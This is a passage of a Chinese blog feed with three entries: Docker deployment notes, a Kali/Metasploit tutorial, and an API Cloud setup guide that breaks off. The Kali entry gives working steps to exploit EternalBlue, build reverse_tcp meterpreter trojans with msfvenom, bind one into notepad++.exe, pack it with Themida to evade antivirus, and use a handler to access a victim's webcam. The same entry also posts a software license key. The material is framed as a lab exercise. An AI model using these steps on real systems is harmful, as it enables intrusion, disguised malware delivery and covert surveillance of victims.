class="built_in">cd</span> /var/lib/docker/volumes/.../_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挂载</span></span><br><span class="line">docker run -d \  </span><br><span class="line">--name mysql \  </span><br><span class="line">-p 3306:3306 \  </span><br><span class="line">-e TZ=Asia/Shanghai \  </span><br><span class="line">-e MYSQL_ROOT_PASSWORD=123 \  </span><br><span class="line">-v /root/mysql/data:/var/lib/mysql \  </span><br><span class="line">-v /root/mysql/init:/docker-entrypoint-initdb.d \  </span><br><span class="line">-v /root/mysql/conf:/etc/mysql/conf.d \</span><br><span class="line">mysql</span><br></pre></td></tr></table></figure><h2 id="自定义镜像"><a href="#自定义镜像" class="headerlink" title="自定义镜像"></a>自定义镜像</h2><p>镜像中包含了程序运行需要的系统函数库、环境、配置、依赖。<br>因此，自定义镜像本质就是依次准备好程序运行的基础环境、依赖、应用本身、运行配置等<strong>文件</strong>，并且<strong>打包</strong>而成。</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8530318a04dc4f9683438db942b9218a~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=672&h=221&s=59687&e=png&b=fdfcfc" alt="image.png"></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1c3bce40192f4594b91374789911b634~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=1280&h=705&s=260694&e=png&b=f8f8f8" alt="image.png"></p><h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><p>提供了<strong>自动打包镜像</strong>的功能。我们只需要将打包的过程，每一层要做的事情用固定的语法写下来，交给Docker去执行即可。<a href="https://docs.docker.com/engine/reference/builder/">指令文档</a></p><table><thead><tr><th><strong>指令</strong></th><th><strong>说明</strong></th><th><strong>示例</strong></th></tr></thead><tbody><tr><td><strong>FROM</strong></td><td>指定基础镜像</td><td><code>FROM centos:6</code></td></tr><tr><td><strong>ENV</strong></td><td>设置环境变量，可在后面指令使用</td><td><code>ENV key value</code></td></tr><tr><td><strong>COPY</strong></td><td>拷贝本地文件到镜像的指定目录</td><td><code>COPY ./xx.jar /tmp/app.jar</code></td></tr><tr><td><strong>RUN</strong></td><td>执行Linux的shell命令，一般是安装过程的命令</td><td><code>RUN yum install gcc</code></td></tr><tr><td><strong>EXPOSE</strong></td><td>指定容器运行时监听的端口，是给镜像使用者看的</td><td>EXPOSE 8080</td></tr><tr><td><strong>ENTRYPOINT</strong></td><td>镜像中应用的启动命令，容器运行时调用</td><td>ENTRYPOINT java -jar xx.jar</td></tr></tbody></table><p>基于Ubuntu镜像来构建一个Java应用，其Dockerfile内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定基础镜像</span></span><br><span class="line">FROM ubuntu:16.04</span><br><span class="line"><span class="comment"># 配置环境变量，JDK的安装目录、容器内时区</span></span><br><span class="line">ENV JAVA_DIR=/usr/local</span><br><span class="line">ENV TZ=Asia/Shanghai</span><br><span class="line"><span class="comment"># 拷贝jdk和java项目的包</span></span><br><span class="line">COPY ./jdk8.tar.gz <span class="variable">$JAVA_DIR</span>/</span><br><span class="line">COPY ./docker-demo.jar /tmp/app.jar</span><br><span class="line"><span class="comment"># 设定时区</span></span><br><span class="line">RUN <span class="built_in">ln</span> -snf /usr/share/zoneinfo/<span class="variable">$TZ</span> /etc/localtime &amp;&amp; <span class="built_in">echo</span> <span class="variable">$TZ</span> &gt; /etc/timezone</span><br><span class="line"><span class="comment"># 安装JDK</span></span><br><span class="line">RUN <span class="built_in">cd</span> <span class="variable">$JAVA_DIR</span> \</span><br><span class="line"> &amp;&amp; tar -xf ./jdk8.tar.gz \</span><br><span class="line"> &amp;&amp; <span class="built_in">mv</span> ./jdk1.8.0_144 ./java8</span><br><span class="line"><span class="comment"># 配置环境变量</span></span><br><span class="line">ENV JAVA_HOME=<span class="variable">$JAVA_DIR</span>/java8</span><br><span class="line">ENV PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin</span><br><span class="line"><span class="comment"># 指定项目监听的端口</span></span><br><span class="line">EXPOSE 8080</span><br><span class="line"><span class="comment"># 入口，java项目的启动命令</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;/app.jar&quot;</span>]</span><br></pre></td></tr></table></figure><p><strong>构建镜像</strong></p><p>当Dockerfile文件写好以后，就可以利用命令来构建镜像了。</p><p>执行命令，构建镜像：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 进入镜像目录</span><br><span class="line">cd /root/demo</span><br><span class="line"># 开始构建</span><br><span class="line">docker build -t docker-demo:1.0 .</span><br></pre></td></tr></table></figure><p>命令说明：</p><ul><li><p><code>docker build </code>: 就是构建一个docker镜像</p></li><li><p><code>-t docker-demo:1.0</code> ：<code>-t</code>参数是指定镜像的名称（<code>repository</code>和<code>tag</code>）</p></li><li><p><code>.</code> : 最后的点是指构建时Dockerfile所在路径，由于我们进入了demo目录，所以指定的是<code>.</code>代表当前目录，也可以直接指定Dockerfile目录：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接指定Dockerfile目录</span></span><br><span class="line">docker build -t docker-demo:1.0 /root/demo</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f314a8c442104a678103c6df418d5c8f~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=1567&h=485&s=87803&e=png&b=011d30"></p><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6d2678c75bed4112a4b0e4649bbc817c~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=831&h=400&s=83708&e=png&b=f7f7f7" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.用基本命令，寻找Networks.bridge.IPAddress属性</span></span><br><span class="line">docker inspect mysql</span><br><span class="line"><span class="comment"># 也可以使用format过滤结果</span></span><br><span class="line">docker inspect --format=<span class="string">&#x27;&#123;&#123;range .NetworkSettings.Networks&#125;&#125;&#123;&#123;println .IPAddress&#125;&#125;&#123;&#123;end&#125;&#125;&#x27;</span> mysql</span><br><span class="line"><span class="comment"># 得到IP地址如下：</span></span><br><span class="line">172.17.0.2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.然后通过命令进入dd容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="built_in">dd</span> bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.在容器内，通过ping命令测试网络</span></span><br><span class="line">ping 172.17.0.2</span><br><span class="line"> <span class="comment"># 结果</span></span><br><span class="line">PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data. </span><br><span class="line">64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.053 ms</span><br><span class="line">64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.059 ms</span><br><span class="line">64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.058 ms</span><br></pre></td></tr></table></figure><h3 id="自定义网络"><a href="#自定义网络" class="headerlink" title="自定义网络"></a>自定义网络</h3><p>容器的网络IP其实是一个虚拟的IP，其值并不固定与某一个容器绑定，如果我们在开发时写死某个IP，而在部署时很可能MySQL容器的IP会发生变化，连接会失败。</p><p>加入自定义网络的容器才可以通过容器名相互访问，Docker的网络操作命令如下<br><a href="https://docs.docker.com/engine/reference/commandline/network/">官网</a></p><table><thead><tr><th><strong>命令</strong></th><th><strong>说明</strong></th><th><strong>文档地址</strong></th></tr></thead><tbody><tr><td>docker network create</td><td>创建一个网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_create/">docker network create</a></td></tr><tr><td>docker network ls</td><td>查看所有网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_ls/">docs.docker.com</a></td></tr><tr><td>docker network rm</td><td>删除指定网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_rm/">docs.docker.com</a></td></tr><tr><td>docker network prune</td><td>清除未使用的网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_prune/">docs.docker.com</a></td></tr><tr><td>docker network connect</td><td>使指定容器连接加入某网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_connect/">docs.docker.com</a></td></tr><tr><td>docker network disconnect</td><td>使指定容器连接离开某网络</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_disconnect/">docker network disconnect</a></td></tr><tr><td>docker network inspect</td><td>查看网络详细信息</td><td><a href="https://docs.docker.com/engine/reference/commandline/network_inspect/">docker network inspect</a></td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.首先通过命令创建一个网络</span></span><br><span class="line">docker network create hmall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.然后查看网络</span></span><br><span class="line">docker network <span class="built_in">ls</span></span><br><span class="line"><span class="comment"># 结果：</span></span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">639bc44d0a87   bridge    bridge <span class="built_in">local</span></span><br><span class="line">403f16ec62a2   hmall     bridge <span class="built_in">local</span></span><br><span class="line">0dc0f72a0fbb   host      host <span class="built_in">local</span></span><br><span class="line">cd8d3e8df47b   none      null <span class="built_in">local</span></span><br><span class="line"><span class="comment"># 其中，除了hmall以外，其它都是默认的网络</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.让dd和mysql都加入该网络，注意，在加入网络时可以通过--alias给容器起别名</span></span><br><span class="line"><span class="comment"># 这样该网络内的其它容器可以用别名互相访问！</span></span><br><span class="line"><span class="comment"># 3.1.mysql容器，指定别名为db，另外每一个容器都有一个别名是容器名</span></span><br><span class="line">docker network connect hmall mysql --<span class="built_in">alias</span> db</span><br><span class="line"><span class="comment"># 3.2.db容器，也就是我们的java项目</span></span><br><span class="line">docker network connect hmall <span class="built_in">dd</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.进入dd容器，尝试利用别名访问db</span></span><br><span class="line"><span class="comment"># 4.1.进入容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="built_in">dd</span> bash</span><br><span class="line"><span class="comment"># 4.2.用db别名访问</span></span><br><span class="line">ping db</span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line">PING db (172.18.0.2) 56(84) bytes of data. </span><br><span class="line">64 bytes from mysql.hmall (172.18.0.2): icmp_seq=1 ttl=64 time=0.070 ms</span><br><span class="line">64 bytes from mysql.hmall (172.18.0.2): icmp_seq=2 ttl=64 time=0.056 ms</span><br><span class="line"><span class="comment"># 4.3.用容器名访问</span></span><br><span class="line">ping mysql</span><br><span class="line"><span class="comment"># 结果：</span></span><br><span class="line">PING mysql (172.18.0.2) 56(84) bytes of data. </span><br><span class="line">64 bytes from mysql.hmall (172.18.0.2): icmp_seq=1 ttl=64 time=0.044 ms</span><br><span class="line">64 bytes from mysql.hmall (172.18.0.2): icmp_seq=2 ttl=64 time=0.054 ms</span><br></pre></td></tr></table></figure><p><strong>后端部署</strong></p><p>将项目打包 + dockerfile和jae 构建镜像 + 创建运行容器即可</p><p><strong>前端部署</strong></p><ol><li>创建nginx, 挂载数据卷，部署前端项目</li><li>要将nginx.conf 中的接口代理后端域名换成后端java应用的容器名  </li><li>访问使用宿主机的ip加nginx配置的端口即可</li></ol><h2 id="DockerCompose"><a href="#DockerCompose" class="headerlink" title="DockerCompose"></a>DockerCompose</h2><p>Docker Compose就可以帮助我们实现<strong>多个相互关联的Docker容器的快速部署</strong>。它允许用户通过一个单独的 docker-compose.yml 模板文件（YAML 格式）来定义一组相关联的应用容器。<a href="https://b11et3un53m.feishu.cn/docx/Wq51d3o2koFiptxqby9cHTNznpd#O3FOdWFZvozcxbxNaJbcOWjHnTe">基本语法</a></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1550c64fbaa64d798e5a5b2e9fd107db~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=465&h=316&s=63405&e=png&b=f7f7f7" alt="image.png"></p><p><strong>命令形式和docker compose对比</strong></p><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/ddba85c3e215497caeaea59bdc3134d2~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=903&h=337&s=182517&e=png&b=021c31" alt="image.png"></p><p><strong>doker compose 命令格式</strong></p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/edd89385ad1e47208ca3905bc7ba3729~tplv-k3u1fbpfcp-jj-mark:0:0:0:0:q75.image#?w=625&h=389&s=101630&e=png&b=dedddd" alt="image.png"></p><h3 id="一个前后端项目部署的基本-DockerCompose-yml-文件"><a href="#一个前后端项目部署的基本-DockerCompose-yml-文件" class="headerlink" title="一个前后端项目部署的基本 DockerCompose.yml 文件"></a>一个前后端项目部署的基本 DockerCompose.yml 文件</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&quot;3.8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">mysql:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">mysql</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;3306:3306&quot;</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">TZ:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">      <span class="attr">MYSQL_ROOT_PASSWORD:</span> <span class="number">123</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./mysql/conf:/etc/mysql/conf.d&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./mysql/data:/var/lib/mysql&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./mysql/init:/docker-entrypoint-initdb.d&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">hm-net</span></span><br><span class="line">  <span class="attr">hmall:</span></span><br><span class="line">    <span class="attr">build:</span> </span><br><span class="line">      <span class="attr">context:</span> <span class="string">.</span></span><br><span class="line">      <span class="attr">dockerfile:</span> <span class="string">Dockerfile</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">hmall</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:8080&quot;</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">hm-net</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">mysql</span></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;18080:18080&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;18081:18081&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./nginx/nginx.conf:/etc/nginx/nginx.conf&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./nginx/html:/usr/share/nginx/html&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">hmall</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">hm-net</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">hm-net:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">hmall</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://docs.docker.com/engine/install/centos/&quot;&gt;安装Docker&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;1-卸载旧版&quot;&gt;&lt;a href=&quot;#1-卸载旧版&quot; class=&quot;heade</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/07/07/Kali/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/07/07/Kali/</id>
    <published>2023-07-07T01:04:55.645Z</published>
    <updated>2023-10-16T02:49:58.066Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><h2 id="安装下载"><a href="#安装下载" class="headerlink" title="安装下载"></a>安装下载</h2><h3 id="安装-vmware"><a href="#安装-vmware" class="headerlink" title="安装  vmware"></a>安装  vmware</h3><p>链接：<a href="https://pan.baidu.com/s/1wRa5ygQVd-ztFvgyXgAJ5w">https://pan.baidu.com/s/1wRa5ygQVd-ztFvgyXgAJ5w</a> </p><p>提取码：pngm </p><p>vmware 17 激活码4A4RR-813DK-M81A9-4U35H-06KND</p><p><strong>一直下一步下一步搞定，安装好打开有下的界面就算安装完成</strong></p><h3 id="Kali下载"><a href="#Kali下载" class="headerlink" title="Kali下载"></a>Kali下载</h3><p><a href="https://www.kali.org/">官网</a></p><p>选择  <strong>Virtual Machines</strong>  下的 <strong>VMware</strong> </p><p>下载解压之后双击  <strong>kali-linux-2022.3-vmware-amd64.vmx</strong>  文件运行即可</p><p>启动虚拟机，登录账号 默认 kali&#x2F;kali</p><h3 id="初步使用"><a href="#初步使用" class="headerlink" title="初步使用"></a>初步使用</h3><p><a href="https://www.kali.org/tools/">Kali工具</a></p><ol><li><p>sudo su  输入kali用户密码 (切换管理员账号)</p></li><li><p>msfconsole （msf : metasploit framework 工具名称，渗透工具（进行攻击））（此命令是打开msf的命令行界面）</p></li><li><p>msf使用法则：</p></li></ol><p>  使用模块  use module_name<br>  配置模块选项 set property value  （模块选项是可以更换的，set payload module_name）<br>  运行模块 run</p><h4 id="msf攻击永恒之蓝（eternalblue）的流程："><a href="#msf攻击永恒之蓝（eternalblue）的流程：" class="headerlink" title="msf攻击永恒之蓝（eternalblue）的流程："></a>msf攻击永恒之蓝（eternalblue）的流程：</h4><p>根据漏洞编号查询模块</p><p>​search ms17_010 （ 找到eternalblue）</p><ol><li><p>use exoloit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</p></li><li><p>查看选项 show options 或者 直接 options  [reuqire 为 yes必选]</p></li><li><p>设置选项 </p><p>有<strong>msf模块</strong>的选项和<strong>payload模块</strong>的选项（这里默认是windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp，作用是通过msf攻击之后能够获取到没目标系统的操作权限）</p><p>set RHOSTS 192.168.1.133  (攻击目标，单独一个或者是一个网段192.168.1.133-254）</p><p>set LPORT 12345 (listen port: 代表你要在kali上开启的端口，范围：1-65535，但不能被占用)</p></li><li><p>运行 run </p></li><li><p>成功之后通过  help 查看获取权限命令</p></li></ol><p><strong>注意：不是所有的攻击都会成功，前提是目标有该漏洞  防火墙关闭</strong>  </p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="msfvenom生成远程控制木马"><a href="#msfvenom生成远程控制木马" class="headerlink" title="msfvenom生成远程控制木马"></a>msfvenom生成远程控制木马</h4><p>msfvanom：用来生成后门的软件，在目标机上执行后门，在本地监听上线 <strong>（msfvanom 是在shell使用的，不是msfconsole终端，即使用的时候是跟msfconsole一样的‘同层级’）</strong></p><p>生成 <code>demo.exe</code> 木马程序  windows&#x2F;linux&#x2F;安卓..</p><p>windows: <code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.186.1.163 lport=9999 -f exe -o demo.exe</code></p><p>linux: <code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.186.1.163 lport=9999 -f exe -o demo.exe</code></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230709131921455.png" alt="image-20230709131921455"></p><p><strong>生成程序在当前终端打开所处的位置</strong></p><p><strong>但是容易被杀毒软件杀掉，如何解决</strong></p><h5 id="第一种-这种不免杀，但不需要安装，只需要目标点击启动"><a href="#第一种-这种不免杀，但不需要安装，只需要目标点击启动" class="headerlink" title="第一种 (这种不免杀，但不需要安装，只需要目标点击启动)"></a>第一种 (这种不免杀，但不需要安装，只需要目标点击启动)</h5><ol><li>msfconsole</li><li>use exploit&#x2F;multi&#x2F;handler</li><li>show options</li><li>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp (切换 payload 模块)</li><li>set lhost 192.186.1.163 （kali地址）</li><li>set lport 9999 （更木马程序生成的lport保持一致）</li><li>run</li></ol><p>此时当受害者点击木马程序的时候，kali就会<strong>监听到自动跳转</strong>到 <strong>meterpreter</strong> 的终端，同样通过 <strong>help</strong> 去查看获取到那些执行命令</p><p> <img src="https://gitee.com/hisai/image-bed/raw/master/image-20230709131458803.png" alt="image-20230709131458803"></p><p>Webcam_list： 查看目标机是否有可执行的操作，如：录像，前提是目标机有摄像头功能</p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230709131622969.png" alt="image-20230709131622969"></p><p>Webcam_stream：执行</p><h5 id="第二种-捆绑木马"><a href="#第二种-捆绑木马" class="headerlink" title="第二种 捆绑木马"></a>第二种 捆绑木马</h5><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.186.1.163 lport=9999 -f exe -x notepad++.exe -o notepad++.exe</code></p><p>关键 <strong>-x notepad++.exe</strong>  </p><h5 id="第三种-加壳（压缩壳，加密壳）"><a href="#第三种-加壳（压缩壳，加密壳）" class="headerlink" title="第三种 加壳（压缩壳，加密壳）"></a>第三种 加壳（压缩壳，加密壳）</h5><p><a href="https://www.oreans.com/">Themida</a></p><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230709132930831.png" alt="image-20230709132930831"></p><h4 id="新建虚拟机作为攻击目标"><a href="#新建虚拟机作为攻击目标" class="headerlink" title="新建虚拟机作为攻击目标"></a>新建虚拟机作为攻击目标</h4><p><a href="https://blog.csdn.net/qi341500/article/details/128974230">新建步骤相关1</a>    <a href="https://blog.csdn.net/qq_40926887/article/details/125657206">新建步骤相关2</a></p><h5 id="1-虚拟机中PXE-MOF-Exiting-intel-PXE-ROM-Operating-system-not-found解决方法"><a href="#1-虚拟机中PXE-MOF-Exiting-intel-PXE-ROM-Operating-system-not-found解决方法" class="headerlink" title="1. 虚拟机中PXE-MOF:Exiting intel PXE ROM.Operating system not found解决方法"></a>1. 虚拟机中PXE-MOF:Exiting intel PXE ROM.Operating system not found解决方法</h5><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230707114702077.png" alt="image-20230707114702077"></p><p><a href="https://next.itellyou.cn/Original/#cbp=Product?ID=dfb4715d-5e52-ea11-bd34-b025aa28351d">iso映像文件下载地址</a>  注意需要的是 <strong>.ISO 后缀</strong>的文件</p><h5 id="2-安装界面显示不全，需要调整分辨率"><a href="#2-安装界面显示不全，需要调整分辨率" class="headerlink" title="2. 安装界面显示不全，需要调整分辨率"></a>2. 安装界面显示不全，需要调整分辨率</h5><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230707121218129.png" alt="image-20230707121218129"></p><h5 id="3-设置基础软件库出错"><a href="#3-设置基础软件库出错" class="headerlink" title="3. 设置基础软件库出错"></a>3. 设置基础软件库出错</h5><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230707121307577.png" alt="image-20230707121307577"></p><p><a href="https://blog.csdn.net/qq_36393978/article/details/128232326">相关资料</a></p><ol><li><p>先查看<strong>网络和主机</strong>，并开启连接</p></li><li><p>配置安装源</p><p>协议选择为：https:&#x2F;&#x2F;<br>路径填写：vault.centos.org&#x2F;8.5.2111&#x2F;BaseOS&#x2F;x86_64&#x2F;os&#x2F;<br>URL类型是：软件库URL</p></li></ol><h5 id="4-创建管理员账户和普通用户"><a href="#4-创建管理员账户和普通用户" class="headerlink" title="4. 创建管理员账户和普通用户"></a>4. 创建管理员账户和普通用户</h5><p><img src="https://gitee.com/hisai/image-bed/raw/master/image-20230707133824186.png" alt="image-20230707133824186"></p><p>​最后重启 –&gt;接收许可</p><p>5.查看ip  </p><p>​ip addr 或者  ifconfig</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Kali&quot;&gt;&lt;a href=&quot;#Kali&quot; class=&quot;headerlink&quot; title=&quot;Kali&quot;&gt;&lt;/a&gt;Kali&lt;/h1&gt;&lt;h2 id=&quot;安装下载&quot;&gt;&lt;a href=&quot;#安装下载&quot; class=&quot;headerlink&quot; title=&quot;安装下载&quot;&gt;&lt;/a</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>API Cloud</title>
    <link href="https://hisai3.github.io/hisai3.github.io/2023/04/10/API%20Cloud/"/>
    <id>https://hisai3.github.io/hisai3.github.io/2023/04/10/API%20Cloud/</id>
    <published>2023-04-10T06:31:31.000Z</published>
    <updated>2023-11-24T09:51:51.477Z</updated>
    
    <content type="html"><![CDATA[<h1 id="API-Cloud"><a href="#API-Cloud" class="headerlink" title="API Cloud"></a>API Cloud</h1><h2 id="创建项目-官网"><a href="#创建项目-官网" class="headerlink" title="创建项目 官网"></a>创建项目 <a href="https://www.apicloud.com/">官网</a></h2><h3 id="1-进入官网，在首页下载开发工具（拉代码需要）"><a href="#1-进入官网，在首页下载开发工具（拉代码需要）" class="headerlink" title="1.  进入官网，在首页下载开发工具（拉代码需要）"></a>1.  进入官网，在首页下载开发工具（拉代码需要）</h3><h3 id="2-注册账号，创建应用"><a href="#2-注册账号，创建应用" class="headerlink" title="2. 注册账号，创建应用"></a>2. 注册账号，创建应用</h3><p><img src="https://gitee.com/hisai/image-bed/raw/master/APICloud/image-20230410141859982.png" alt="image-20230410141859982"></p><h3 id="3-编译打包流程"><a href="#3-编译打包流程" class="headerlink" title="3. 编译打包流程"></a>3. 编译打包流程</h3><p>   <img src="https://gitee.com/hisai/image-bed/raw/master/APICloud/image-20230410142337872.png" alt="image-20230410142337872"></p><h3 id="4-开发工具登录注册的账号，导入项目，选择云端检测"><a href="#4-开发工具登录注册的账号，导入项目，选择云端检测" class="headerlink" title="4. 开发工具登录注册的账号，导入项目，选择云端检测"></a>4. 开发工具登录注册的账号，导入项目，选择云端检测</h3><p>   <img src="https://gitee.com/hisai/image-bed/raw/master/APICloud/image-20230410142407949.png" alt="image-20230410142407949"></p><h3 id="5-代码管理和真机调试，右键项目文件夹"><a 